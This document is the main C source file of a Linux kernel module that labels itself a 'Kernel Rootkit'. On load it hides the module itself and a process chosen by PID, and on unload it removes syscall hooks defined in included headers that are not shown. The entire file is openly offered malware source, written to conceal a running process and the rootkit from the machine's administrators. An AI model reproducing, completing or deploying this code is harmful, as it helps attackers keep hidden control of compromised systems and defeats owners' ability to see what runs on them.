
#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <asm/unistd_64.h>
#include <linux/proc_fs.h>

#include "hooker.h"
#include "fake_syscalls.h"
#include "module_hiding.h"
#include "process_hiding.h"

struct task_struct *ts;
int hidden_pid;

module_param(hidden_pid, int, S_IRUSR | S_IRGRP);
MODULE_PARM_DESC(hidden_pid, "The PID of the process that needs hiding.");

static int __init init_rootkit(void)
{
    hide_module(THIS_MODULE);
    hide_process_pid(hidden_pid);

    return 0;
}

static void __exit cleanup_rootkit(void)
{
    unhook_all();
}

module_init(init_rootkit);
module_exit(cleanup_rootkit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Pedro Peck");
MODULE_DESCRIPTION("Kernel Rootkit");
